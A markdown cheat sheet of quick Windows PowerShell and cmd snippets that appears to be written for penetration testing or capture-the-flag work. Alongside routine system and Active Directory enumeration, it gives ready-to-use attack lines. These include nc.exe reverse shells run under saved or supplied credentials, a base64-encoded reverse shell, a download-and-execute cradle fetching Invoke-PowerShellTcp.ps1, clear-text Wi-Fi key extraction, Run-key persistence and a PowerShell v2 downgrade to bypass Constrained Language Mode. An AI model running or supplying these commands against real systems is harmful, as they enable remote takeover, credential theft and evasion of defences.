# Command Snippets.  
This section is devoted for small, quick and dirty commands!   

## Windows  

__Powershell encoded command__.  
```
```

__Get System Information__

```
Get everything:
Get-ComputerInfo

Search for all properties:
Get-ComputerInfo -Property '*' | More
Get Windows Edition:
Get-ComputerInfo -Property 'WindowsEditionId'

Get Windows ProductName: 
Get-ComputerInfo -Property 'WindowsProductName' 

Get Windows Version:
Get-ComputerInfo -Property 'WindowsVersion'

Get Build label:
Get-ComputerInfo -Property 'WindowsBuildLabEx' 
```
__Less Alternative__
```
More is less (unix) on Windows.
Pun intended
```
__Current User information__
```
whoami
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
echo $env:username
```

__Local Computer FQDN__
```
[System.Net.Dns]::GetHostEntry([string]"localhost").HostName
```

__Get Computername__
```
echo $env:computername
Get-ComputerInfo -Property 'CsName' 
```
__Get/Set  Enviroment__

_Get_
```
Get-ChildItem env: | sort name
```

_Set_
```
Set-Item -Path Env:Path -Value ($Env:Path + ";C:\Temp")
```
__Get Powershell History User__
```
cat (Get-PSReadlineOption).HistorySavePath
```
__Show hotfixes/updates__
```
Get all hotfixes
Get-HotFix

Search for a hotfix
Get-Hotfix -Id <<KB-Number>> -ErrorAction SilentlyContinue

Get recently installed
(Get-HotFix | Sort-Object -Property InstalledOn)[-1]
```
__Get Local Drives__
```
Get-PsDrive
```
__Get AD Users__  
NOTE: ActiveDirectory Module should be imported
```
Get-ADUser -Filter * -Properties samAccountName | select samAccountName
```
__Get All groups in AD__
```
Get-ADGroup -filter * -properties GroupCategory | ft name,groupcategory
```
__Get all OU's in AD__
```
Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A
```

__See all Users who belong to a group__
```
 Get-ADGroupMember "Service Accounts"
```

__Run command as a different User__

_cmd.exe_
```
Please note that this only works when a previous user has used the /savecred flag
runas /user:.\<<USERNAME>> /savecred 'nc.exe -e cmd.exe 10.10.14.13 6666'
```
 
 _powershell_
```
$username = 'DOMAINNAME\\USERNAME';$password = 'PASSWORD';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePassword; Invoke-Command -Credential $credential -ComputerName localhost -Verbose -ScriptBlock {C:\inetpub\wwwroot\nc.exe -e powershell  10.10.8.1 4444}
```

## Get,Edit,Set Registry 

__Get Registry keys__

```
Get-Item -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

__Search Registry__

```
get-childitem -path hkcu:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*Control*"}
```

__Set Edit Registry Key__

```
Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'VMware User Process' -value 'C:\Program Files\VMware\VMware Tools\vmtoolsd.exe'
```

__Create New Key__

```
New-Item –Path "HKCU:\dummy" –Name NetwrixKey
```

## Wireless
__Extract Wireless Keys__
```
$output = netsh wlan show profiles  | Select-String -AllMatches -Pattern ": (.*)" |% {$_.Matches.Groups} |? {$_.Name -eq 1} | Select-Object -Property Value  ; $output |% {"netsh wlan show profile name=$($_.Value) key=clear" |  iex}
```

## Execute Encoded Command 

```
Base64 Encoded
$Text="nc -e cmd.exe 10.10.10.1 4444";$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText =[Convert]::ToBase64String($Bytes);$EncodedText

Execute Command
powershell -c EncodedCommand bgBjACAALQBlACAAYwBtAGQALgBlAHgAZQAgADEAMAAuADEAMAAuADEAMAAuADEAIAA0ADQANAA0AA==
```

## Bypass Constrained Language Mode

```
powershell -version 2 
```

## Download file and execute

```
powershell -command iex (New-Object System.Net.WebClient).DownloadString('http://10.10.14.11/Invoke-PowerShellTcp.ps1')
```

## Get Groups of username 

```
Get-ADPrincipalGroupMembership username | select name
```

## Get LDAP properties Deleted Users
```
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Properties *
```

## Show which user belong to which group in whole AD 
```
Get-ADGroup -filter * -properties GroupCategory | ForEach-Object { echo $.name ; Get-Adgroupmember -identity  $.name | ft name  }
```

## Unix 

